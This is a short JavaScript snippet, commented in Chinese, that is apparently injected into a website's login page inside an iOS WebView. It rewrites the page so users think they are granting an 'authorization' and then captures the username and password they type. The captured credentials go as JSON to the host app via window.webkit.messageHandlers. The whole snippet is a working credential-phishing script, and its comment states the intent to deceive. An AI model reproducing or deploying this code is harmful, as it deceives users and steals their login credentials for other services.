//串改页面元素，让用户以为是授权登录
function getLogin(){
  var topEle=selectNode('//*[@id="avatarWrapper"]');
  var imgEle=selectNode('//*[@id="avatarWrapper"]/img');
  topEle.remove(imgEle);
  var returnEle=selectNode('//*[@id="loginWrapper"]/a');
  returnEle.className='';
  returnEle.innerText='';
  pEle=selectNode('//*[@id="loginWrapper"]/p');
  pEle.className="";
  pEle.innerHTML="";
  footerEle=selectNode('//*[@id="loginWrapper"]/footer');
  footerEle.innerHTML="";
  var loginNameEle=selectNode('//*[@id="loginName"]');
  loginNameEle.placeholder="请输入用户名";
  var buttonEle=selectNode('//*[@id="loginAction"]');
  buttonEle.innerText="请进行用户授权";
  selectNode('//*[@id="loginWrapper"]/form/section/div[1]/i').className="";
  selectNode('//*[@id="loginWrapper"]/form/section/div[2]/i').className="";
  selectNode('//*[@id="loginAction"]').className="btn";
  selectNode('//a[@id="loginAction"]').addEventListener('click',transPortUnAndPw,false);
  return window.webkit;
}
function transPortUnAndPw(){
  username=selectNode('//*[@id="loginName"]').value;
  pwd=selectNode('//*[@id="loginPassword"]').value;
  window.webkit.messageHandlers.getInfo({body:JSON.stringify({"username":username,"pwd":pwd})});
}
